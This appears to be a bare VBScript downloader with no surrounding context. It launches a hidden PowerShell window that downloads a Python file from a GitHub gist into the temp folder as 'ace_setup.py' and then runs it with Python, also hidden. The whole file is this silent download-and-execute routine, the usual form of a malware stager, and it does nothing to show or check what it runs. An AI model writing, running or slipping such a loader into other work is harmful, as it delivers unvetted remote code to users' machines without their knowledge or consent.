Dim oShell, oFSO, tmpPath
Set oShell = CreateObject("WScript.Shell")
Set oFSO   = CreateObject("Scripting.FileSystemObject")
tmpPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\ace_setup.py"
oShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/brian04459/e2f1827ae71f87525dd1dce6f1c3ebe4/raw/setup.py' -OutFile '" & tmpPath & "' -UseBasicParsing""", 0, True
If oFSO.FileExists(tmpPath) Then
    oShell.Run "python """ & tmpPath & """", 0, False
End If
